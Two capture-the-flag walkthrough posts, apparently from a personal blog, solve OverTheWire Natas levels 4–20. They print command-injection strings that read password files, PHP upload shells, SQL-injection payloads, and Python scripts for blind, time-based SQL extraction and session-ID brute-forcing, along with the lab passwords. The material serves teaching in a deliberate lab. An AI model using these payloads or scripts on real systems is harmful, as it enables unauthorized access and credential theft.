Introduced: HTTP headers, Burp Suite Solution Outline: Searching the Web: On the homepage, it says: \u0026ldquo;Access disallowed. You are visiting from \u0026quot;\u0026rdquo; while authorized users should come only from \u0026ldquo;http://natas5.natas.labs.overthewire.org/\".\nSpoofing the Referer Header: This prompt suggests that the Referer header is being checked. Spoof the Referer header to access the password for Natas5.\nUsing Burp Suite: Used Burp Suite to intercept the request and modify the Referer header to `http://natas5.natas.labs.overthewire.org\nPassword: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK Level 5: Cookies Commands/Tools Introduced: Developer Tools Solution Outline: Homepage: The homepage displays a message: \u0026ldquo;You are not logged in.\u0026rdquo;\nViewing Cookies: Inspected the cookies for the page and found a cookie named loggedin with a value of 0.\nModifying Cookies: Changed the value of the loggedin cookie to 1 using the browser developer tools. After this, we can see the password for Natas6.\nPassword: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned Level 6: Source Code Analysis Commands/Tools Introduced: Developer Tools Solution Outline: Source Code Analysis: Looked at the source code and found a PHP script that checks for the secret key.\nAccessing the Secret: The script checks if the secret key is equal to the value of the secret parameter in the URL. Accessed the secret page by setting the secret parameter to the correct value.\nPassword: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS Level 7: URL Parameters and Command Injection Commands/Tools Introduced: URL parameters, Command injection Solution Outline: Source Code Analysis: Found a PHP script index.php that takes a page parameter and includes the content of the file specified by the parameter. IN the script it mentions that the password for Natas8 is in /etc/natas_webpass/natas8.\nCommand Injection: Used command injection to read the contents of the password file by passing the appropriate command as the page parameter. https://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8\nPassword: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q Level 8: Leaked Secret in Source Code Commands/Tools Introduced: Developer Tools, Python3 Solution Outline: Source Code Analysis: Found a PHP script that encodes the secret key using base64.\nfunction encodeSecret($secret) { return bin2hex(strrev(base64_encode($secret))); } Decoding the Secret: Wrote a small Python script to decode the secret key\nimport base64 encoded_secret = \u0026#34;3d3d516343746d4d6d6c315669563362\u0026#34; bytes_data = bytes.fromhex(encoded_secret) reversed_data = bytes_data[::-1] decoded_secret = base64.b64decode(reversed_data).decode(\u0026#39;utf-8\u0026#39;) print(\u0026#34;Decoded secret:\u0026#34;, decoded_secret) Accessing the Secret: Used the decoded secret to access the password for Natas9.\nPassword: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t Level 9: Command Injection with URL Parameters Commands/Tools Introduced: Command injection, URL parameters Solution Outline: Source Code Analysis: Found a PHP script that takes a needle parameter and searches for it in a dictionary file.\nCommand Injection: Used command injection to read the contents of the password file by passing the appropriate command as the needle parameter. anything; cat /etc/natas_webpass/natas10\nPassword: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu Level 10: Bypassing Filter with Command Injection Commands/Tools Introduced: Command injection, URL encoding Solution Outline: Source Code Analysis: Found a PHP script that filters certain characters from the input. The characters it removes are ;, |, and \u0026amp;. \u0026lt;? $key = \u0026#34;\u0026#34;; if(array_key_exists(\u0026#34;needle\u0026#34;, $_REQUEST)) { $key = $_REQUEST[\u0026#34;needle\u0026#34;]; } if($key != \u0026#34;\u0026#34;) { if(preg_match(\u0026#39;/[;|\u0026amp;]/\u0026#39;,$key)) { print \u0026#34;Input contains an illegal character!\u0026#34;; } else { passthru(\u0026#34;grep -i $key dictionary.txt\u0026#34;); } } ?\u0026gt; Bypassing the Filter: The grep command is structured like this: grep -i \u0026lt;needle\u0026gt; dictionary.txt. We can bypass the filter by using the following command: grep -i \u0026lt;needle\u0026gt; \u0026lt;file1.txt\u0026gt; dictionary.txt as we can provide the file1.txt as the needle and it will be ignored by the filter. a /etc/natas_webpass/natas11 Password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk Level 11: Encryption and Decryption Commands/Tools Introduced: Encryption, Decryption Solution Outline: Source Code Analysis: Found a PHP script that encrypts the data using a simple XOR cipher.\n\u0026lt;? $defaultdata = array( \u0026#34;showpassword\u0026#34;=\u0026gt;\u0026#34;no\u0026#34;, \u0026#34;bgcolor\u0026#34;=\u0026gt;\u0026#34;#ffffff\u0026#34;); function xor_encrypt($in) { $key = \u0026#39;\u0026lt;censored\u0026gt;\u0026#39;; $text = $in; $outText = \u0026#39;\u0026#39;; // Iterate through each character for($i=0;$i\u0026lt;strlen($text);$i++) { $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } function loadData($def) { global $_COOKIE; $mydata = $def; if(array_key_exists(\u0026#34;data\u0026#34;, $_COOKIE)) { $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[\u0026#34;data\u0026#34;])), true); if(is_array($tempdata) \u0026amp;\u0026amp; array_key_exists(\u0026#34;showpassword\u0026#34;, $tempdata) \u0026amp;\u0026amp; array_key_exists(\u0026#34;bgcolor\u0026#34;, $tempdata)) { if (preg_match(\u0026#39;/^#(?:[a-f\\d]{6})$/i\u0026#39;, $tempdata[\u0026#39;bgcolor\u0026#39;])) { $mydata[\u0026#39;showpassword\u0026#39;] = $tempdata[\u0026#39;showpassword\u0026#39;]; $mydata[\u0026#39;bgcolor\u0026#39;] = $tempdata[\u0026#39;bgcolor\u0026#39;]; } } } return $mydata; } function saveData($d) { setcookie(\u0026#34;data\u0026#34;, base64_encode(xor_encrypt(json_encode($d)))); } $data = loadData($defaultdata); if(array_key_exists(\u0026#34;bgcolor\u0026#34;,$_REQUEST)) { if (preg_match(\u0026#39;/^#(?:[a-f\\d]{6})$/i\u0026#39;, $_REQUEST[\u0026#39;bgcolor\u0026#39;])) { $data[\u0026#39;bgcolor\u0026#39;] = $_REQUEST[\u0026#39;bgcolor\u0026#39;]; } } saveData($data); ?\u0026gt; Decryption: After analyzing the encryption function, I wrote a decryption function in PHP to decrypt the cookie data. Inital Cookie: HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=\n$originalString = json_encode(array(\u0026#34;showpassword\u0026#34; =\u0026gt; \u0026#34;no\u0026#34;, \u0026#34;bgcolor\u0026#34; =\u0026gt; \u0026#34;#ffffff\u0026#34;)); $cookieString = base64_decode(\u0026#39;HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=\u0026#39;); echo $originalString ^ $cookieString; Ouput came to be eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe. The secret key is probably eDWo. The repetition of the key comes from XOR.\nAccessing the Password: Another script, in PHP, to encrypt the password and set the cookie.\n$key = \u0026#39;eDWo\u0026#39;; $newString = json_encode(array(\u0026#34;showpassword\u0026#34; =\u0026gt; \u0026#34;yes\u0026#34;, \u0026#34;bgcolor\u0026#34; =\u0026gt; \u0026#34;#ffffff\u0026#34;)); $cookieData = \u0026#39;\u0026#39;; for ($i = 0; $i \u0026lt; strlen($newString); $i++) { $cookieData .= $key[$i % strlen($key)] ^ $newString[$i]; } echo base64_encode($cookieData); This gave us the cookie as HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5. Setting this cookie in the browser gave us the password for Natas12.\nPassword: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB Level 12: File Upload Vulnerability Commands/Tools Introduced: File upload, PHP reverse shell Solution Outline: Source Code Analysis: Analyzed a PHP script that accepts a filename parameter via $_POST. This script extracts the file extension from the uploaded filename and allows files to be uploaded as long as they end with .php.\nPHP File Upload: Uploaded a malicious PHP file with the filename set to malicious.php, which contained the following code:\n\u0026lt;?php echo exec(\u0026#34;cat /etc/natas_webpass/natas13\u0026#34;); ?\u0026gt; Accessing the Uploaded File: After successfully uploading the PHP file, Saw it got uploaded as JPG. This became JPG as there was a piece of code in the source code that changed the extension. After this, run the file to get the password for Natas13.\nPassword: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC Level 13: File Upload Vulnerability Part 2 Commands/Tools Introduced: File upload, PHP reverse shell Solution Outline: Source Code Analysis: This time, the php code is doing a check that checks the \u0026ldquo;magic\u0026rdquo; bytes of the file to ensure it is an image. We can bypass this by uploading a file that is both an image and a PHP file.\nCreating a PHP Shell:\nwith open(\u0026#39;natas13.jpeg\u0026#39;, \u0026#39;wb\u0026#39;) as shell: shell.write(b\u0026#39;\\xFF\\xD8\\xFF\\xE0\u0026#39; + b\u0026#34;\u0026lt;?php passthru(\u0026#39;cat /etc/natas_webpass/natas14\u0026#39;); ?\u0026gt;\u0026#34;) Uploading the File: We upload it as we did it last time and then access the file to get the password for Natas14.\nPassword: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ Level 14: SQL Injection Commands/Tools Introduced: SQL injection Solution Outline: Source Code Analysis: Found a PHP script that takes a username and password parameter and checks them against a database. The code is vulnerable to SQL injection.\nSQL Injection: Used SQL injection to bypass the login check \u0026quot; or 1=1 -- as the username and password. This will return the password for Natas15.\nPassword: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx Level 15: Blind SQL Injection Commands/Tools Introduced: SQL injection Solution Outline: Source Code Analysis: Found a PHP script that takes a username parameter and checks it against a database. The code is vulnerable to SQL injection as when we run \u0026quot; or 1=1 -- as the username, it returns error in the query.\nSQL Injection: We can see in the source code, we would need to bruteforce the password. This can be done using a python script.\nimport requests target = \u0026#34;http://natas15.natas.labs.overthewire.org/\u0026#34; charset = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34; password = \u0026#34;\u0026#34; natas15_password = \u0026#34;SdqIqBsFcz3yotlNYErZSZwblkm0lrvx\u0026#34; while len(password) \u0026lt; 32: for c in charset: test_password = password + c + \u0026#34;%\u0026#34; username = f\u0026#39;natas16\u0026#34; AND password LIKE BINARY \u0026#34;{test_password}\u0026#34; \u0026#34;\u0026#39; r = requests.get( target, auth=(\u0026#34;natas15\u0026#34;, natas15_password), params={\u0026#34;username\u0026#34;: username} ) if \u0026#34;This user exists\u0026#34; in r.text: password += c print(f\u0026#34;Password so far: {password}\u0026#34;) break print(f\u0026#34;Final password: {password}\u0026#34;) Accessing the Password: After running the script, we get the password for Natas16.\nPassword: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo Key Takeaways SQL Injection: Learned how to exploit SQL injection vulnerabilities to bypass login checks and extract sensitive information. File Upload Vulnerabilities: Explored file upload vulnerabilities to execute arbitrary code on the server. Encryption and Decryption: Analyzed encryption schemes and wrote decryption scripts to reveal hidden information. Command Injection: Leveraged command injection to execute system commands and read sensitive files. Cheatsheet for This Week Commands \u0026amp; Tools Used: Developer Tools: Browser developer tools were used to inspect elements, modify cookies, and view page source code. Burp Suite: Intercept and modify HTTP headers. Command Injection: Used URL parameters to inject commands (e.g., cat /etc/natas_webpass/natasX). SQL Injection: username=\u0026quot; or 1=1 -- for bypassing login Blind SQL Injection to brute force password character by character PHP Scripting: XOR-based encryption/decryption for cookies File uploads with PHP code for reverse shell Encoding and decoding of parameters using base64 and hex Python Scripts: Base64 decoding: import base64 encoded_secret = \u0026#34;3d3d516343746d4d6d6c315669563362\u0026#34; bytes_data = bytes.fromhex(encoded_secret) reversed_data = bytes_data[::-1] decoded_secret = base64.b64decode(reversed_data).decode(\u0026#39;utf-8\u0026#39;) Blind SQL Injection Brute Force: import requests target = \u0026#34;http://natas15.natas.labs.overthewire.org/\u0026#34; charset = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34; password = \u0026#34;\u0026#34; natas15_password = \u0026#34;SdqIqBsFcz3yotlNYErZSZwblkm0lrvx\u0026#34; while len(password) \u0026lt; 32: for c in charset: test_password = password + c + \u0026#34;%\u0026#34; username = f\u0026#39;natas16\u0026#34; AND password LIKE BINARY \u0026#34;{test_password}\u0026#34; \u0026#34;\u0026#39; r = requests.get( target, auth=(\u0026#34;natas15\u0026#34;, natas15_password), params={\u0026#34;username\u0026#34;: username} ) if \u0026#34;This user exists\u0026#34; in r.text: password += c break print(\u0026#34;Password:\u0026#34;, password) SQL Commands: Basic SQL Injection: username=\u0026quot; or 1=1 -- Blind SQL Injection using LIKE BINARY operator to check characters of the password Software Vulnerability Insights Key Vulnerabilities Exploited: Command Injection:\nInjection into URL parameters allowed direct system commands. Examples: Running cat commands to access password files. File Upload Vulnerability:\nLacked checks on file types, allowing PHP shell uploads. Solution involved checking file “magic bytes” but was bypassed by crafting files with both image and PHP code. SQL Injection:\nLack of parameterized queries led to SQL injection vulnerabilities. Techniques used included bypassing login checks and blind SQL injection for password extraction. Weak Authentication and Cookie Manipulation:\nSession management flaws allowed cookie modification (changing loggedin from 0 to 1). XOR encryption in cookies with repeated key usage made decryption trivial. Insecure File Access Controls:\nDirectory access allowed for finding sensitive files (e.g., accessing /s3cr3t/users.txt through robots.txt). These sections summarize the tools, techniques, and key vulnerabilities encountered across the walkthrough. Let me know if you need a more detailed breakdown of any particular section!\n","permalink":"https://knamit.github.io/blogs/posts/natas/natas_0/","summary":"\u003ch1 id=\"blog-1-getting-started-with-natas--web-security-fundamentals\"\u003eBlog 1: Getting Started with Natas – Web Security Fundamentals\u003c/h1\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eWelcome to the Natas web security challenge series! This blog marks the start of a journey through Natas, a platform created to enhance understanding of web security concepts like basic authentication, HTTP headers, and source code analysis. In this post, I\u0026rsquo;ll guide you through the initial levels, where we’ll explore fundamental techniques for assessing web vulnerabilities.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"levels-overview\"\u003eLevels Overview\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eLevels Covered:\u003c/strong\u003e 0–4\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTheme:\u003c/strong\u003e Basics of web authentication, HTTP protocols, and client-server interactions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSkills Learned:\u003c/strong\u003e\n\u003cul\u003e\n\u003cli\u003eBasic authentication techniques\u003c/li\u003e\n\u003cli\u003eHTTP headers and responses\u003c/li\u003e\n\u003cli\u003eAnalyzing HTML and source code for security flaws\u003c/li\u003e\n\u003cli\u003eIntroduction to input validation vulnerabilities\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"level-by-level-walkthrough\"\u003eLevel-by-Level Walkthrough\u003c/h2\u003e\n\u003ch3 id=\"level-0-source-code-analysis\"\u003eLevel 0: Source Code Analysis\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCommands/Tools Introduced:\u003c/strong\u003e Browser developer tools.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"solution-outline\"\u003eSolution Outline:\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eAccessing the Page:\u003c/strong\u003e\nLook at the source code for the initial page and identify the password for Natas1.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4 id=\"password-0nzcigaq7t2ialyvu9xchlyn4mlkiwlq\"\u003ePassword: \u003ccode\u003e0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq\u003c/code\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"images/natas1.png\" alt=\"Level 0 Progress\"  /\u003e\n\u003c/p\u003e","title":"Natas Part 1"},{"content":"Blog 1: Getting Started with Natas Part 2 – Web Security Fundamentals Introduction Continuing our journey through the Natas wargame, we dive deeper into web security fundamentals. In this blog, we explore levels 16-30, focusing on advanced topics like SQL injection, file upload vulnerabilities, encryption, and command injection. By the end of this walkthrough, you’ll have a solid understanding of common web security vulnerabilities and how to exploit them effectively.\nLevels Overview Levels Covered: 16-20 Theme: Advanced web security concepts, including SQL injection, command injection, file upload vulnerabilities, and encryption. Level-by-Level Walkthrough Level 16: Blind SQL Injection Commands/Tools Introduced: SQL Injection, Command Injection Solution Outline: Analysing the source code: The source code is designed to prevent typical attacks like SQL injection and XSS by restricting special characters. Instead, it utilizes the grep command to search for strings based on user input, providing a way to extract information from the underlying files.\nBypassing the logic: When a user inputs a character, such as \u0026ldquo;a,\u0026rdquo; the system executes grep -i a dictionary.txt, which retrieves all entries containing \u0026ldquo;a.\u0026rdquo; The goal is to uncover the password located in /etc/natas_webpass/natas17.\nInjection Strategy: To check for the existence of a character (e.g., \u0026ldquo;b\u0026rdquo;) in the natas17 file, the user can construct the command $(grep b /etc/natas_webpass/natas17)Africans. This command translates to grep -i $(grep b /etc/natas_webpass/natas17)Africans dictionary.txt in the backend. If \u0026ldquo;b\u0026rdquo; is found, the inner command returns \u0026ldquo;b,\u0026rdquo; leading to a search for \u0026ldquo;bAfricans.\u0026rdquo; If \u0026ldquo;b\u0026rdquo; is absent, the inner command is empty, and the search falls back to just \u0026ldquo;Africans.\u0026rdquo;\nEvaluation: The response depends on whether \u0026ldquo;b\u0026rdquo; exists in the natas17 file. If \u0026ldquo;b\u0026rdquo; is present, a result will be returned for \u0026ldquo;bAfricans.\u0026rdquo; If not, the result for \u0026ldquo;Africans\u0026rdquo; will be empty, indicating that \u0026ldquo;b\u0026rdquo; is indeed in the file.\nAutomating the Process: To automate the process, a Python script can be used to iterate through the character set and determine the password character by character. After this, we can use regex to extract the password from the response.\nimport requests from requests.auth import HTTPBasicAuth auth = HTTPBasicAuth(\u0026#34;natas16\u0026#34;, \u0026#34;hPkjKYviLQctEW33QmuXL6eDVfMW4sGo\u0026#34;) filteredchars = \u0026#34;\u0026#34; passwd = \u0026#34;\u0026#34; allchars = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\u0026#34; for char in allchars: r = requests.get( \u0026#34;http://natas16.natas.labs.overthewire.org/?needle=dooms$(grep \u0026#34; + char + \u0026#34; /etc/natas_webpass/natas17)\u0026#34;, auth=auth, ) if \u0026#34;dooms\u0026#34; not in r.text: filteredchars = filteredchars + char print(filteredchars) for i in range(32): for char in filteredchars: r = requests.get( \u0026#34;http://natas16.natas.labs.overthewire.org/?needle=dooms$(grep ^\u0026#34; + passwd + char + \u0026#34; /etc/natas_webpass/natas17)\u0026#34;, auth=auth, ) if \u0026#34;dooms\u0026#34; not in r.text: passwd = passwd + char print(passwd) break Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC Level 17: Advanced SQL Injection Commands/Tools Introduced: SQL Injection, Command Injection, Time-Based Blind SQL Injection Solution Outline: Understanding the Challenge: The level presents a search feature that allows users to search for specific strings in the database. This time we don\u0026rsquo;t have any feedback on the search results, making it a blind SQL injection challenge.\nExploiting the Vulnerability: The goal is to extract the password from the users table in the natas17 database. By crafting SQL queries that return true or false based on specific conditions, we can extract the password character by character. Here, we use a time-based blind SQL injection technique to determine the presence of characters in the password.\nAutomating the Process: I came up with a Python script that iterates through the character set and extracts the password character by character using time delays to determine the presence of characters in the password.\nimport requests from time import * characters = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#34; username = \u0026#34;natas17\u0026#34; password = \u0026#34;EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC\u0026#34; Url = \u0026#34;http://natas17.natas.labs.overthewire.org\u0026#34; session = requests.session() current_password = list() while True: for character in characters: startTime = time() response = session.post( Url, data={ \u0026#34;username\u0026#34;: \u0026#39;natas18\u0026#34; AND password LIKE BINARY \u0026#34;\u0026#39; + \u0026#34;\u0026#34;.join(current_password) + character + \u0026#39;%\u0026#34; AND SLEEP(5) #\u0026#39; }, auth=(username, password), ) endTime = time() if endTime - startTime \u0026gt; 5: print(\u0026#34;Password so far \u0026#34; + \u0026#34;\u0026#34;.join(current_password) + character) current_password.append(character) break if len(current_password) == 32: break Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ Level 18: Weak Session Management Commands/Tools Introduced: Session Management, Weak Session Tokens Solution Outline: Understanding the Challenge: At first, it looks like a simple SQLi challenge, but the real vulnerability lies in the session management. We start by looking at the source code, but no luck in understanding the system. Next we look at Burp Suite to intercept the request and see the request.\nExploiting the Vulnerability: We notice that the session ID is a weak number. We try brute-forcing the session ID and find the password.\nAutomating the Process: I came up with a Python script that iterates through the session ID and extracts the password.\nimport requests target = \u0026#34;http://natas18.natas.labs.overthewire.org\u0026#34; auth = (\u0026#34;natas18\u0026#34;, \u0026#34;6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ\u0026#34;) params = {\u0026#34;username\u0026#34;: \u0026#34;natas18\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;admin\u0026#34;} max_s_id = 640 s_id = 1 while s_id \u0026lt;= max_s_id: print(\u0026#34;Trying with PHPSESSID = \u0026#34; + str(s_id)) cookies = {\u0026#34;PHPSESSID\u0026#34;: str(s_id)} r = requests.get(target, auth=auth, params=params, cookies=cookies) if \u0026#34;You are an admin\u0026#34; in r.text: print(r.text) break s_id += 1 Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr Level 19: Session Management Pt 2 Commands/Tools Introduced: Session Management, Weak Session Tokens Solution Outline: Understanding the Challenge: The challenge is like the previous one, but this time the session ID is not sequential. We need to find a way to generate the session ID.\nExploiting the Vulnerability: Once, we capture the session ID, we notice that it is encoded in ASCII. We use the decoder in Burp Suite to decode the session ID and see that the cookie is a number suffixed by \u0026ldquo;-natas20\u0026rdquo;. Here, natas20 is the username.\nAutomating the Process: We change the script to encode the session ID in ASCII and append \u0026ldquo;-natas20\u0026rdquo; to it.\nimport requests target = \u0026#34;http://natas19.natas.labs.overthewire.org\u0026#34; auth = (\u0026#34;natas19\u0026#34;, \u0026#34;tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr\u0026#34;) params = {\u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;something\u0026#34;} max_s_id = 640 s_id = 1 while s_id \u0026lt;= max_s_id: # Suffix \u0026#34;-natas20\u0026#34; and encode to ASCII session_id = f\u0026#34;{s_id}-admin\u0026#34; print(\u0026#34;Trying with PHPSESSID = \u0026#34; + session_id) cookies = {\u0026#34;PHPSESSID\u0026#34;: session_id.encode(\u0026#34;ascii\u0026#34;).hex()} r = requests.get(target, auth=auth, params=params, cookies=cookies) if \u0026#34;regular user\u0026#34; not in r.text: print(\u0026#34;Found! Session ID: \u0026#34; + session_id) print(r.text) break s_id += 1 Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw Level 20: Session Management Pt 3 Commands/Tools Introduced: Session Management Solution Outline: Understanding the Challenge: The challenge involves a session management system where the session ID is handled manually instead of using PHP\u0026rsquo;s built-in session handling.This time we have a bunch of my* functions; open, close, read, write, etc. These are registered with session_set_save_handler which, per PHP documentation, “sets user-level session storage functions.”\nExploiting the Vulnerability: The mywrite function stores session variables as space-delimited lines, which myread then parses back into $_SESSION. The vulnerability is that user input, such as name=foo \\n admin 1, can introduce newlines in the session file, effectively injecting an extra session variable. This allows an attacker to set $_SESSION[\u0026quot;admin\u0026quot;] to 1, bypassing access controls and enabling the print_credentials function to reveal sensitive information, like a password.\nAutomating the Process: We come up with a python script to set the user name to admin\\nadmin 1 and get the password.\nimport requests target = \u0026#34;http://natas20.natas.labs.overthewire.org\u0026#34; auth = (\u0026#34;natas20\u0026#34;, \u0026#34;p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\u0026#34;) params = {\u0026#34;name\u0026#34;: \u0026#34;admin\\nadmin 1\u0026#34;, \u0026#34;debug\u0026#34;: \u0026#34;\u0026#34;} # This is the key part cookies = {} r = requests.get(target, auth=auth, params=params, cookies=cookies) # Retrieve PHPSESSID if it exists in response cookies phpsessid = r.cookies.get(\u0026#34;PHPSESSID\u0026#34;, None) print(r.text) if phpsessid: print(\u0026#34;#\u0026#34;) params = {\u0026#34;debug\u0026#34;: \u0026#34;\u0026#34;} cookies = {\u0026#34;PHPSESSID\u0026#34;: phpsessid} # Second request using the same PHPSESSID r = requests.get(target, auth=auth, params=params, cookies=cookies) print(r.text) else: print(\u0026#34;PHPSESSID cookie not found in the first request response.\u0026#34;) Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH Key Takeaways Mastery of foundational web security concepts like SQL injection, command injection, and session management is crucial for understanding how attackers exploit web applications. By approaching each Natas level incrementally, users gain hands-on experience in analyzing source code, identifying vulnerabilities, and implementing automation to streamline attacks. Each solution highlights the importance of creativity and careful observation in bypassing security measures, especially when direct feedback is unavailable, as in blind SQL injection challenges. Cheatsheet for This Week SQL Injection (Blind \u0026amp; Time-Based):\nCheck for vulnerabilities using SQL queries that manipulate time delays or conditional responses to reveal hidden information without direct output. Use automation to brute-force character-by-character when no direct response is provided. Command Injection:\nObserve where user input may be executed as a command. Wrapping input in functions or sub-commands (e.g., $(command)) can exploit back-end command processing. Session Management:\nTest session identifiers for patterns or weak entropy, such as sequential or predictable tokens. In cases where custom session handling is used, investigate for improper encoding or parsing of user input that could allow session variable manipulation. Python Automation Tips:\nUse the requests library to automate repetitive tasks and brute-force attacks, especially for character-based extraction. Incorporate time-based logic in Python scripts to identify delays that indicate conditional responses, useful for blind SQL injection. Progress Gallery (Add images for each level completed to visually track progress.)\nSoftware Vulnerability Insights Key Vulnerabilities Exploited: SQL Injection:\nLeveraged in levels with blind injection, enabling data extraction even when results aren’t directly visible to the user. Used to exploit databases by injecting SQL statements and using conditional or time-based responses. Command Injection:\nOccurs when the system executes arbitrary commands due to unsanitized user input, as seen in levels utilizing grep. By crafting input that invokes sub-commands, sensitive data is extracted from restricted directories. Weak Session Management:\nLevels with weak or predictable session IDs highlight the importance of robust session token generation. Exploiting these tokens through brute force or decoding reveals restricted information by allowing unauthorized access. Custom Session Handling Vulnerabilities:\nVulnerabilities in custom session handling mechanisms allow attackers to manipulate session variables directly, bypassing access controls. Injecting newline characters or manipulating session file data can elevate privileges, showcasing the risk of improperly handling session storage and parsing user input. These insights underscore the importance of securing both input handling and session management in web applications, as these vulnerabilities are among the most commonly exploited in real-world scenarios.\n","permalink":"https://knamit.github.io/blogs/posts/natas/natas_1/","summary":"\u003ch1 id=\"blog-1-getting-started-with-natas-part-2--web-security-fundamentals\"\u003eBlog 1: Getting Started with Natas Part 2 – Web Security Fundamentals\u003c/h1\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eContinuing our journey through the Natas wargame, we dive deeper into web security fundamentals. In this blog, we explore levels 16-30, focusing on advanced topics like SQL injection, file upload vulnerabilities, encryption, and command injection. By the end of this walkthrough, you’ll have a solid understanding of common web security vulnerabilities and how to exploit them effectively.\u003c/p\u003e","title":"Natas Part 2"}]